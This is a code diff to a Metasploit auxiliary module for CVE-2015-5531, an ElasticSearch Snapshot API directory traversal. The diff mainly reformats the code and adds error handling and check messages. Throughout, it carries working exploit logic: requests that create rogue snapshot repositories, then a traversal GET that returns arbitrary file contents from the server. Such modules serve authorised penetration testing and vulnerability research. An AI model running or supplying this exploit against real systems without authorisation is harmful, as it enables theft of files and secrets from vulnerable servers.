@@ -11,26 +11,32 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::HttpClient
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name'           => 'ElasticSearch Snapshot API Directory Traversal',
-      'Description'    => %q{
-        'This module exploits a directory traversal vulnerability in
-        ElasticSearch, allowing an attacker to read arbitrary files
-        with JVM process privileges, through the Snapshot API.'
-      },
-      'References'     =>
-        [
+    super(
+      update_info(
+        info,
+        'Name' => 'ElasticSearch Snapshot API Directory Traversal',
+        'Description' => %q{
+          'This module exploits a directory traversal vulnerability in
+          ElasticSearch, allowing an attacker to read arbitrary files
+          with JVM process privileges, through the Snapshot API.'
+        },
+        'References' => [
           ['CVE', '2015-5531'],
           ['PACKETSTORM', '132721']
         ],
-      'Author'         =>
-        [
+        'Author' => [
           'Benjamin Smith', # Vulnerability Discovery
           'Pedro Andujar <pandujar[at]segfault.es>', # Metasploit Module
           'Jose A. Guasch <jaguasch[at]gmail.com>', # Metasploit Module
         ],
-      'License'        => MSF_LICENSE
-    ))
+        'License' => MSF_LICENSE,
+        'Notes' => {
+          'Reliability' => UNKNOWN_RELIABILITY,
+          'Stability' => UNKNOWN_STABILITY,
+          'SideEffects' => UNKNOWN_SIDE_EFFECTS
+        }
+      )
+    )
 
     register_options(
       [
@@ -44,21 +50,25 @@ class MetasploitModule < Msf::Auxiliary
   def check_host(ip)
     res1 = send_request_raw(
       'method' => 'POST',
-      'uri'    => normalize_uri(target_uri.path, '_snapshot', 'pwn'),
-      'data'   => '{"type":"fs","settings":{"location":"dsr"}}'
+      'uri' => normalize_uri(target_uri.path, '_snapshot', 'pwn'),
+      'data' => '{"type":"fs","settings":{"location":"dsr"}}'
     )
+
+    return Exploit::CheckCode::Unknown('Failed to connect to the target.') unless res1
 
     res2 = send_request_raw(
       'method' => 'POST',
-      'uri'    => normalize_uri(target_uri.path, '_snapshot', 'pwnie'),
-      'data'   => '{"type":"fs","settings":{"location":"dsr/snapshot-ev1l"}}'
+      'uri' => normalize_uri(target_uri.path, '_snapshot', 'pwnie'),
+      'data' => '{"type":"fs","settings":{"location":"dsr/snapshot-ev1l"}}'
     )
 
+    return Exploit::CheckCode::Unknown('Failed to connect to the target.') unless res2
+
     if res1.body.include?('true') && res2.body.include?('true')
-      return Exploit::CheckCode::Appears
+      return Exploit::CheckCode::Appears('Successfully created snapshot repositories, suggesting the Snapshot API is vulnerable to CVE-2015-5531.')
     end
 
-    Exploit::CheckCode::Safe
+    Exploit::CheckCode::Safe('Failed to create snapshot repositories.')
   end
 
   def read_file(file)
@@ -73,10 +83,15 @@ class MetasploitModule < Msf::Auxiliary
 
     res = send_request_raw(
       'method' => 'GET',
-      'uri'    => travs
+      'uri' => travs
     )
 
-    if res && res.code == 400
+    unless res
+      print_error("No response received from the target.")
+      return nil
+    end
+
+    if res.code == 400
       return res.body
     else
       print_status("Server returned HTTP response code: #{res.code}")
@@ -89,8 +104,8 @@ class MetasploitModule < Msf::Auxiliary
     vprint_status("Checking if it's a vulnerable ElasticSearch")
 
     check_code = check_host(ip)
-    print_status("#{check_code.message}")
-    if check_host(ip) != Exploit::CheckCode::Appears
+    print_status(check_code.message)
+    unless check_code == Exploit::CheckCode::Appears
       return
     end
 
